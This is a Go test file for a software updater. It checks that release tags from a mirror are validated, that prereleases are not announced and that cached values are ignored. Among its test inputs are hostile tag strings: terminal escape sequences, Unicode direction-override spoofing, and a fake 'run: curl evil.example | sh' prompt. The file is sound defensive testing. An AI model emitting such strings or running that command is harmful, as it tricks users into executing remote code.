package update

import (
	"encoding/json"
	"errors"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"testing"
	"time"
)

// These tests stand for a mirror, set with DARKORY_UPDATE_URL, that answers what GitHub never
// would: a prerelease as the latest release, or a tag that is not a version.

func TestValidTag(t *testing.T) {
	for tag, want := range map[string]bool{
		"v1.2.3":                             true,
		"v0.0.1":                             true,
		"v1.3.0-rc.1":                        true,
		"v1.3.0-alpha-2.x":                   true,
		"v1.2.3+build.5":                     true,
		"v1.2.3-rc.1+build":                  true,
		"1.2.3":                              false,
		"v1.2":                               false,
		"v1":                                 false,
		"v01.2.3":                            false,
		"v1.2.3-01":                          false,
		"v1.2.3-":                            false,
		"v1.2.3+":                            false,
		"v1.2.3\n":                           false,
		"v1.2.3 ":                            false,
		"v1.2.3-rc.1\x1b[2J":                 false,
		"\x1b]0;PWNED\x07v1.2.3":             false,
		"v1.2.3-r‮c":                         false,
		"v1.2.3-" + strings.Repeat("a", 200): false,
	} {
		if got := ValidTag(tag); got != want {
			t.Errorf("ValidTag(%q) = %v, want %v", tag, got, want)
		}
	}
}

// TestLatestRefusesAPrerelease: a mirror offering a signed prerelease as the latest release
// gets nothing installed or announced, and the prerelease still installs when named.
func TestLatestRefusesAPrerelease(t *testing.T) {
	oldBin, err := os.ReadFile(buildFake(t, "v1.0.0"))
	if err != nil {
		t.Fatal(err)
	}
	rcBin, err := os.ReadFile(buildFake(t, "v1.1.0-rc.1"))
	if err != nil {
		t.Fatal(err)
	}
	pub, priv := newKey(t)
	gh := serveReleases(t,
		newFakeRelease(t, priv, "v1.0.0", runtime.GOOS, runtime.GOARCH, oldBin),
		newFakeRelease(t, priv, "v1.1.0-rc.1", runtime.GOOS, runtime.GOARCH, rcBin),
	)
	client := gh.client()
	if rel, err := client.Latest(t.Context()); !errors.Is(err, ErrPrerelease) {
		t.Fatalf("Latest = %+v, %v; want ErrPrerelease", rel, err)
	}

	c := &Checker{Client: client, Current: "v1.0.0", CacheFile: filepath.Join(t.TempDir(), "update-check.json")}
	if st, _ := c.Check(t.Context()); st.Available() || st.Latest != "" {
		t.Errorf("Check = %+v, want no release announced", st)
	}
	if n := gh.downloads.Load(); n != 0 {
		t.Errorf("%d downloads, want none", n)
	}

	exe := install(t, oldBin)
	rel, err := client.Release(t.Context(), "v1.1.0-rc.1")
	if err != nil {
		t.Fatal(err)
	}
	u := &Updater{Client: client, PublicKey: pub, Current: "v1.0.0", Executable: exe, GOOS: runtime.GOOS, GOARCH: runtime.GOARCH}
	if err := u.Apply(t.Context(), rel); err != nil {
		t.Fatalf("Apply(the named prerelease): %v", err)
	}
	if got := runVersion(t, exe); got != "v1.1.0-rc.1" {
		t.Errorf("after naming the prerelease the binary says %q", got)
	}
}

// TestLookupRefusesATagThatIsNotAVersion: a tag carrying terminal escapes, or anything else that
// is not a version, is refused, and the error shows it escaped.
func TestLookupRefusesATagThatIsNotAVersion(t *testing.T) {
	for _, tag := range []string{
		"\x1b]0;PWNED-TITLE\x07\x1b[2J\x1b[31mYOUR TOKEN EXPIRED, run: curl evil.example | sh\x1b[0m",
		"v9.9.9\x1b[2J",
		"v2.0.0-‮gnp.exe",
		"v2",
		"2.0.0",
	} {
		_, priv := newKey(t)
		gh := serveReleases(t, newFakeRelease(t, priv, tag, runtime.GOOS, runtime.GOARCH, []byte("x")))
		client := gh.client()
		_, err := client.Latest(t.Context())
		if !errors.Is(err, ErrBadTag) {
			t.Fatalf("Latest with tag %q: %v, want ErrBadTag", tag, err)
		}
		if msg := err.Error(); strings.ContainsAny(msg, "\x1b\x07‮") {
			t.Errorf("the error prints the tag raw: %q", msg)
		}
		c := &Checker{Client: client, Current: "v1.0.0"}
		if st, _ := c.Check(t.Context()); st.Latest != "" || st.Available() {
			t.Errorf("Check with tag %q = %+v, want nothing remembered", tag, st)
		}
		u := &Updater{Client: client, PublicKey: make([]byte, 32), Current: "v1.0.0", Executable: install(t, []byte("old")), GOOS: runtime.GOOS, GOARCH: runtime.GOARCH}
		if err := u.Apply(t.Context(), Release{Version: tag}); !errors.Is(err, ErrBadTag) {
			t.Errorf("Apply with tag %q: %v, want ErrBadTag", tag, err)
		}
	}
}

// TestReleaseRefusesAnotherVersion: asking for one release and being sent another is refused.
func TestReleaseRefusesAnotherVersion(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		json.NewEncoder(w).Encode(map[string]any{"tag_name": "v9.0.0", "html_url": "x"})
	}))
	t.Cleanup(srv.Close)
	client := &Client{BaseURL: srv.URL}
	if rel, err := client.Release(t.Context(), "v1.0.0"); err == nil {
		t.Errorf("Release(v1.0.0) = %+v, want a refusal", rel)
	}
	if _, err := client.Release(t.Context(), "v1.0.0\x1b[2J"); !errors.Is(err, ErrBadTag) {
		t.Errorf("Release of a name that is not a version: %v, want ErrBadTag", err)
	}
}

// TestCheckForgetsACachedPrerelease: a cache written by an older binary that remembered a
// prerelease, or a tag that is not a version, announces nothing.
func TestCheckForgetsACachedPrerelease(t *testing.T) {
	now := time.Date(2026, 10, 6, 9, 0, 0, 0, time.UTC)
	for _, latest := range []string{"v1.1.0-rc.1", "\x1b]0;PWNED\x07"} {
		cache := filepath.Join(t.TempDir(), "update-check.json")
		b, _ := json.Marshal(cacheEntry{CheckedAt: now.Add(-time.Hour), Latest: latest, URL: "x"})
		if err := os.WriteFile(cache, b, 0o600); err != nil {
			t.Fatal(err)
		}
		c := &Checker{Client: &Client{BaseURL: "http://127.0.0.1:1"}, Current: "v1.0.0", CacheFile: cache, Now: func() time.Time { return now }}
		st, err := c.Check(t.Context())
		if err != nil {
			t.Fatal(err)
		}
		if st.Available() || st.Latest != "" {
			t.Errorf("cached %q: Check = %+v, want nothing announced", latest, st)
		}
	}
	if (Status{Current: "v1.0.0", Latest: "v1.1.0-rc.1"}).Available() {
		t.Error("a prerelease is announced as available")
	}
}
